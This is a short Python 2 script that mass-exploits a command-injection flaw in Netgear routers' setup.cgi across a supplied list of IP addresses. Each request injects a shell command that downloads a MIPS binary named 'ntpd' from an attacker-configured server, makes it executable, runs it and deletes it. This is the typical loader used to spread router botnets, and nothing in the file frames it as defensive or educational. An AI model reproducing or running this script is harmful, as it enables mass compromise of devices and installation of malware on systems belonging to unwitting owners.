#! python !#

import threading, random, socket, time, sys, requests, re, os

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()

server_ip = "1.1.1.1" # IP of binary server 
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # PORTS: 80, 8080, 8888, 5000
# MAKE SURE TO CONFIGURE URL VARIABLE DEFAULT MIPS BINARY NAME: "ntpd"
class send_payload(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://" + self.ip + ":" + port + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://" + server_ip + "/ntpd%20-O%20/var/tmp/ntpd;%20chmod%20777%20/var/tmp/ntpd;%20/var/tmp/ntpd;%20rm%20-rf%20/var/tmp/ntpd&curpath=/&currentsetting.htm=1"
			requests.get(url, timeout=8)
			print "PAYLOAD SENT: %s"%(self.ip)
		except:
			pass

for IP in vulns:
	try:
		ip = "".join(IP)
		ip = ip.replace("\n", "")
		t = send_payload(ip)
		t.start()
		time.sleep(0.09)
	except:
		pass